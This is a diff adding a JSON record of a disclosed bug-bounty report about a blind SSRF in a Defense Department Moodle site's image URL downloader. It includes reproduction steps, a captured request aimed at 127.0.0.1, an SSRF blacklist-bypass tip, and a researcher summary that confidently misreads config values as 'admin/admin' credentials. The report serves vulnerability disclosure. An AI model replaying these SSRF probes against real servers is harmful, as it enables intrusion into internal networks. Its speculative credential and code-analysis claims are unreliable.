@@ -1,0 +1,142 @@
+{
+  "id": 1691501,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjkxNTAx",
+  "url": "https://hackerone.com/reports/1691501",
+  "title": "Blind SSRF via image upload URL downloader on https://██████/ ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-09-05T14:26:08.807Z",
+  "submitted_at": "2022-09-05T14:26:08.852Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "696e746c6f6c",
+    "url": "/696e746c6f6c",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/o2d5k1jooxy710t5jthzfuf7r7bk/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-10-14T13:36:21.475Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-09-19T13:43:44.910Z",
+  "team_member_agreed_on_going_public_at": "2022-10-14T13:36:21.357Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Description:**\nDear DoD,\n\nI found Blind SSRF on one domain from Hack US program.  Original domain is https://█████/ but when you make account and login it redirects you to https://███/my/. Here's the video PoC:\n\n██████\n\n\nThank you!\n\n## Impact\n\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. The attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.\n\n## System Host(s)\n███████\n\n## Affected Product(s) and Version(s)\nWeb App is infected.\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n1. Create a one test account.\n2. Login to that account.\n3. Go to edit profile.\n4. Scroll down there.\n5. Notice user picture field.\n6. Try to upload something.\n7. You will see URL downloader.\n8. Open your burp collaborator client.\n9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png\n10. Poll now in burp collaborator client.\n11. Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means\nwe can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.\n12. Turn your foxy proxy on and open your burp suite.\n13. Paste this ipv4 in URL downloader: http://127.0.0.1/test.png\n14. Intercept request. Request should look like this:\n```javascript\nPOST /repository/repository_ajax.php?action=signin HTTP/1.1\nHost: █████████\nCookie: MoodleSession=c5416a0e3ea3db1606b2876b0b6ac35f; RedirectDouble=1; MOODLEID1_=%25BA%2519V%25E8%25DA%2517\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0\nAccept: */*\nAccept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nContent-Length: 295\nOrigin: https://███████\nReferer: https://█████/user/edit.php\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\n\nfile=http%3A%2F%2F127.0.0.1%2Ftest.png&repo_id=5&p=&page=&env=filemanager&accepted_types[]=.gif&accepted_types[]=.jpe&accepted_types[]=.jpeg&accepted_types[]=.jpg&accepted_types[]=.png&sesskey=h2ixtMF4Fv&client_id=6315fe93ef054&itemid=951353609&maxbytes=1073741824&areamaxbytes=-1&ctx_id=9398501\n```\n15. You will notice one error showing some info about server which confirms Blind SSRF again. The response looks like this:\n```javascript\nHTTP/1.1 200 OK\nServer: nginx\nDate: Mon, 05 Sep 2022 14:05:32 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nX-Powered-By: PHP/7.4.28\nSet-Cookie: RedirectDouble=1; path=/\nSet-Cookie: RedirectDouble=1; path=/\nSet-Cookie: RedirectDouble=1; path=/\nSet-Cookie: RedirectDouble=1; path=/\nCache-Control: no-store, no-cache, must-revalidate\nCache-Control: post-check=0, pre-check=0\nPragma: no-cache\nExpires: Mon, 20 Aug 1969 09:23:00 GMT\nLast-Modified: Mon, 05 Sep 2022 14:05:32 GMT\nAccept-Ranges: none\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Length: 261\n\n{\"list\":[],\"nosearch\":true,\"norefresh\":true,\"nologin\":true,\"error\":\"HTTP\\/1.1 404 Not Found\\r\\nServer: nginx\\r\\nDate: Mon, 05 Sep 2022 14:05:32 GMT\\r\\nContent-Type: text\\/html; charset=utf-8\\r\\nContent-Length: 146\\r\\nConnection: keep-alive\\r\\n\\r\\n\",\"repo_id\":5\n```\n16. By the way if you change to 25 port its leaking something about Postfix SMTP server. \n17. Also I was able to identify that your web app is using libcurl.\n\n## Suggested Mitigation/Remediation Actions\nMy suggestion is to create whitelisted domains in DNS\nThe easiest way to remediate SSRF is to whitelist any domain or address that your application accesses.\nBlacklisting and regex have the same issue, someone will eventually find a way to exploit them\nDo Not Send Raw Responses. Do not use blacklists. use whitelists (allow-lists)\nNever send a raw response body from the server to the client. Responses that the client receives need to be expected.\nEnforce URL Schemas. Allow only URL schemas that your application uses. There is no need to have ftp://, file:/// or even http:// enabled if you only use https://. And if you do use other schemas make sure that they’re only accessible from the part that needs to access them and not from anywhere else.\nEnable Authentication on All Services. Make sure that authentication is enabled on any service that is running inside your network even if they don’t require it. Services like memcached, redis, mongo and others don’t require authentication for normal operations, but this means they can be exploited.\nSanitize and Validate Inputs. Never trust user input. Always sanitize any input that the user sends to your application. Remove bad characters, standardize input (double quotes instead of single quotes for example).After sanitization make sure to validate sanitized input to make sure nothing bad passed through.\nWhy is it Ineffective to Blacklist Domains and IPs? Understanding SSRF Bypass\nOne way to protect against SSRF is to blacklist certain domains and IP addresses. This defense technique is not effective, because hackers can use bypasses to avoid your security measures. Below are a few simple ways attackers can bypass blacklists.\nBypassing Blacklists Using HTTPS. Common blacklists blocking everything on port 80 or the http scheme. but the server will handle requests to 443 or https just fine. Instead of using http://127.0.0.1/ use: https://127.0.0.1/ https://localhost/\nOr create SSRF protection with Bright.\n\n",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 13,
+  "voters": [
+    "zy9ard3",
+    "shreyaschavhan",
+    "ahmed_xyz",
+    "2026",
+    "logic-cracker",
+    "5eyavan",
+    "mr-inspector",
+    "shivammusic",
+    "0x0days",
+    "qweasdzxcvbn",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 189495,
+      "category": "researcher",
+      "content": "```javascript\n$.urlParam = function(name){\n    var results = new RegExp('[\\?&]' + name + '=([^&#]*)').exec(window.location.href);\n    if (results==null){\n       return null;\n    }\n    else{\n       return decodeURI(results[1]) || 0;\n    }\n}\n```\n\n```javascript\nvar results = new RegExp('[\\?&]' + name + '=([^&#]*)').exec(window.location.href);\n```\nSo, variable results are declared with var keyword. Which means it stores new RegExp and actually RegExp object is using ('[\\?&]' but I recommend using =(.+?(?:&|$))') Since The ?! n quantifier matches any string that is not followed by a specific string n. And [] denotes a character class. () denotes a capturing group. [a-z0-9] -- One character that is in the range of a-z OR 0-9. And it's using The exec() method which means it's testing a match in a string. exec(window.location.href) this will just return the URL of the current page. It's using If statement, If the results are equal to null which means it's testing whether the value of a variable results is the null value. And  \n```javascript\nif (results==null){\n       return null;\n    } \n```\nThis code means if results are equal to null which means it's testing whether the value of a variable results is the null value and if the variable results are the null value then it will return null. So basically return null means that  that the expected object couldn't be created. Because we found a variable that returns null. \n```javascript\n  else{\n       return decodeURI(results[1]) || 0;\n    }\n}\n```\nOr else if the code is not executed which means if statement failed then it will return decodeURI() method that decodes a URI.\nI saw that regex that you are using for me is not great at all. I would like to recommend to make a good allow-list in a nutshell whitelist with a good regex. So it would be impossible to bypass protection to gain SSRF. Use regex and unicode chars like this:\n```javascript\nconst text = 'haxorman';\nconst regex = /[\\u0400-\\u04FF]+/g;\n```\n\\w and \\W only matches ASCII based characters; for example, a to z, A to Z, 0 to 9, and. Just suggestion. Or use regex with sticky flag. Also open redirection is possible via image URL downloader. It actually downloads google background image. What if an attacker is able to manipulate victim into downloading some malicious URL.  And I'm not sure is this real or no:\n```javascript\nM.cfg = {\"wwwroot\":\"https:\\/\\/███\",\"sesskey\":\"lkrZzDv8WH\",\"sessiontimeout\":\"7200\",\"themerev\":\"1662685982\",\"slasharguments\":1,\"theme\":\"adaptable\",\"iconsystemmodule\":\"core\\/icon_system_fontawesome\",\"jsrev\":\"1662685982\",\"admin\":\"admin\",\"svgicons\":true,\"usertimezone\":\"America\\/New_York\",\"contextid\":9398501,\"langrev\":1662685982,\"templaterev\":\"1662685982\"};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\\.js/,'.css');me.path=me.path.replace(/\\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};\n```\nNotice admin and admin. I think that's username and password. For admin let's take a look:\n```javascript\nwindow.onload = function(){\n    if(window.location.pathname == '/admin/user.php'){\n        const urlParams = new URLSearchParams(window.location.search);\n        const showmore = urlParams.get('showmore');\n        if(showmore == 'true'){\n            document.getElementsByClassName('moreless-toggler')[0].click();\n        }\n    }\n};\n```\nSo, it's using windoww.onload function. onload event will react when an object has been loaded. Next thing is  \n```javascript\n  if(window.location.pathname == '/admin/user.php'){\n        const urlParams = new URLSearchParams(window.location.search);\n        const showmore = urlParams.get('showmore');\n        if(showmore == 'true'){\n            document.getElementsByClassName('moreless-toggler')[0].click();\n        }\n    }\n};\n```\nSo, window.location.pathname returns the path and filename of the page which means it returns /admin/user.php which is bad. User could bypass this by many ways and access admin login page. And use admin and admin creds to login in.  Then it's using const urlParams = new URLSearchParams(window.location.search); for a case when you need all query parameters. URLSearchParams is an iterable object. And the value of window.location.search is example: ?haxor=1337. Then         const showmore = urlParams.get('showmore'); It's using get parameter 'showmore'. \n```javascript\n  if(showmore == 'true'){\n            document.getElementsByClassName('moreless-toggler')[0].click();\n        }\n    }\n};\n```\nIf showmore is equal to true and then  document.getElementsByClassName('moreless-toggler')[0].click(); and then it will click only on first element with class 'moreless-toggler'. Basically The getElementsByClassName() method returns a collection of elements with a specified class names\n\n\n\nFollow me on twitter if you want! \n\nhttps://twitter.com/0x1int",
+      "updated_at": "2022-10-14T13:30:52.333Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2045840,
+        "username": "696e746c6f6c",
+        "name": "",
+        "bio": "formerly unemployed now self unemployed",
+        "cleared": true,
+        "verified": true,
+        "website": null,
+        "location": "",
+        "created_at": "2021-10-26T16:54:07.049Z",
+        "url": "https://hackerone.com/696e746c6f6c",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/o2d5k1jooxy710t5jthzfuf7r7bk/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/o2d5k1jooxy710t5jthzfuf7r7bk/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/o2d5k1jooxy710t5jthzfuf7r7bk/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
